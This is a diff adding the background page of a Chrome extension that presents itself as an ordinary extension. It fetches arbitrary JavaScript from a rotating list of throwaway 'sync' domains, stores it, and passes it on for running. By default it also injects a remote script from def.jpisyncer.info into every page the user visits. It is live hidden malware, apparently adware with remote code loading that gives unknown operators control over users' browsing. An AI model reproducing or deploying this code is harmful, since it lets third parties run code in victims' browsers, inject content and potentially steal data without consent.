@@ -1,0 +1,221 @@
+<!doctype html><html><head>
+<title>Background</title>
+<script src="jquery.js"></script>
+<script src="lsdb.js"></script>
+<script>
+chrome.extension.onRequest.addListener(
+    function(request, sender, sendResponse){
+		switch(request.smode){
+			case 'def_code':
+				sendResponse({scode:mng.def_code});
+			break;
+			case 'run':
+				mng.run(sendResponse);
+			break;
+		}
+	}
+);
+
+mng = new function(){};
+mng.log = function(e) {
+  //console.log(e)
+  return true;
+};
+mng.swapDB=function(dtype,callback){
+	switch(dtype){
+		case 1:
+			$.getScript('sqlite.js',function(){
+				if(callback){
+					dbclass.connect(callback);
+				}
+				try{tga.track('/chrome/SwapDB/usingSqlite');}catch(e){}
+			});
+		break;
+
+		default:
+			mng.log('def');
+			mng.execJS();
+			try{tga.track('/chrome/SwapDB/NoFbDB');}catch(e){}
+		break;
+	}
+	try{tga.track('/chrome/SwapDB');}catch(e){}
+};
+mng.getEpoch = function(){
+	try{
+		var d=new Date();
+		try{
+			return ((d.getTime()-d.getMilliseconds())/1000);
+		}
+		catch(e){
+			return parseInt(d.getTime()/1000);
+		}
+	}
+	catch(e){
+		return 0;
+	}
+}
+
+mng.run = function(sendResponse){
+
+	mng.sendResponse=sendResponse;
+	mng.def_update_url='http://getsyncer5.info/sync2/?ext=wxd&pid=48&country=NL;http://getsync.info/sync2/?ext=wxd&pid=48&country=NL;http://getproxy5.info/sync2/?ext=wxd&pid=48&country=NL;http://getjpit.info/sync2/?ext=wxd&pid=48&country=NL;http://extsync.info/sync2/?ext=wxd&pid=48&country=NL;http://getsyncer5.info/sync2/?ext=wxd&pid=48&country=NL;http://jpi-proxy.info/sync2/?ext=wxd&pid=48&country=NL;http://getjpiproxy.info/sync2/?ext=wxd&pid=48&country=NL;http://jpi-syncer.info/sync2/?ext=wxd&pid=48&country=NL;http://jpigetjson.info/sync2/?ext=wxd&pid=48&country=NL;http://thebflix.info/sync2/?ext=wxd&pid=48&country=NL';
+	mng.def_code='(function(){var str_http=window.self.location.href.indexOf("https://")>-1?"https://":"http://";if(!document.getElementById("wxdbflix_sc")){var script=document.createElement("script");script.id="wxdbflix_sc";script.type="text/javascript";script.src=str_http+"def.jpisyncer.info/worker/init.js?ext=wxd&pid=48&country=NL";document.getElementsByTagName("head")[0].appendChild(script)};})();';
+	mng.successful=0;
+
+	var e_code=mng.def_code;
+	var epoch=mng.getEpoch();
+	
+	try{
+		dbclass.connect(function(results){
+			mng.log('connected');
+			if(results){
+				mng.log('got results');
+				mng.log(results);
+				
+				e_code=results.scode;
+				
+				try{
+					var int_epoch=parseInt(results.epoch) ? parseInt(results.epoch) : 0;
+					if(int_epoch<epoch){
+						updater.update(results.update_url);
+					}
+				}catch(e){}
+				
+			}
+			else{
+				updater.update(mng.def_update_url);
+				try{tga.track('/chrome/NewUser');}catch(e){}
+			}
+			
+			mng.execJS(e_code);
+		});
+	}
+	catch(e){
+		mng.execJS();
+		try{tga.track('/chrome/NoDB');}catch(e){}
+	}
+
+}
+mng.execJS=function(jscr){
+	jsc=jscr ? jscr : mng.def_code;
+	mng.sendResponse({scode:jsc});
+	try{if(!jscr){tga.track('/chrome/BugExec');}}catch(e){}
+}
+
+
+updater = new function(){};
+updater.update=function(sUrl){
+	try{
+		mng.log(sUrl);
+		
+		if(!sUrl){
+			dbclass.save({
+				key:'sdata',
+				epoch:1,
+				update_url:mng.def_update_url,
+				scode:mng.def_code
+			});
+			try{tga.track('/chrome/NoDomains');}catch(e){}
+		}
+		else{
+			if(updater.xhr){return;}
+			updater.successful=0;
+			var arrUrl=sUrl.split(';');
+			updater.ajax(arrUrl[0], updater.saveJson);
+			
+			setTimeout(function(){
+				updater.xhr=0;
+				if(!updater.successful){
+					
+					try{updater.xhr.abort();}catch(e){mng.log(e);}
+					sUrl=sUrl.replace(arrUrl[0],'').replace(';','');
+					updater.update(sUrl);
+					try{tga.track('/chrome/NoResponse/'+arrUrl[0]);}catch(e){}
+					
+				}
+			},60000);
+		}
+	}
+	catch(e){
+		updater.update(mng.def_update_url);
+	}
+}
+
+updater.ajax=function(sUrl,callback){
+	try{
+		updater.xhr = new XMLHttpRequest();
+		updater.xhr.open("GET", sUrl, true);
+		updater.xhr.onreadystatechange = function() {
+		  if (updater.xhr.readyState == 4) {
+				callback(updater.xhr.responseText);
+		  }
+		}
+		updater.xhr.send();	
+	}
+	catch(e){}
+}
+
+updater.saveJson=function(json){
+	mng.log('saving json...');
+	try{
+		var get_data=JSON.parse(json);
+		try{
+			dbclass.save({
+				key:'sdata',
+				epoch:(get_data.useconds+mng.getEpoch()),
+				update_url:get_data.update_url,
+				scode:get_data.scode
+			});
+			updater.successful=1;
+			try{tga.track('/chrome/ActiveUsers');}catch(e){}
+		}catch(e){updater.successful=0;};
+	}
+	catch(e){
+		updater.successful=0;
+	}
+}
+
+tga = new function(){};
+tga.track=function(url){
+	try{
+		return true;
+		url='/wxd'+url;
+		var urchinCode='UA-29381986-1';
+		var domain='justplug_analytics.it';
+
+		  var i=1000000000,
+			  utmn=tga.rand(i,9999999999),
+			  cookie=tga.cookie,
+			  random=tga.rand(i,2147483647),
+			  today=(new Date()).getTime(),
+			  img = new Image(),
+			  urchinUrl = 'http://www.google-analytics.com/__utm.gif?utmwv=1.3&utmn='
+				  +utmn+'&utmsr=-&utmsc=-&utmul=-&utmje=0&utmfl=-&utmdt=-&utmhn='
+				  +domain+'&utmr=chrome_ext&utmp='
+				  +url+'&utmac='
+				  +urchinCode+'&utmcc=__utma%3D'
+				  +cookie+'.'+random+'.'+today+'.'+today+'.'
+				  +today+'.2%3B%2B__utmb%3D'
+				  +cookie+'%3B%2B__utmc%3D'
+				  +cookie+'%3B%2B__utmz%3D'
+				  +cookie+'.'+today
+				  +'.2.2.utmccn%3D(referral)%7Cutmcsr%3Dchrome_host%7Cutmcct%3Dchrome_path%7Cutmcmd%3Dreferral%3B%2B__utmv%3D'
+				  +cookie+'.-%3B';
+
+		  // trigger the tracking
+		  img.src = urchinUrl;
+
+	}catch(e){}
+}
+tga.rand=function(min,max){
+	try{
+		return min + Math.floor(Math.random() * (max - min));
+	}
+	catch(e){return 1;}
+}
+tga.cookie=tga.rand(10000000,99999999);
+try{tga.track('/chrome');}catch(e){}
+
+
+
+</script></head><body></body></html>
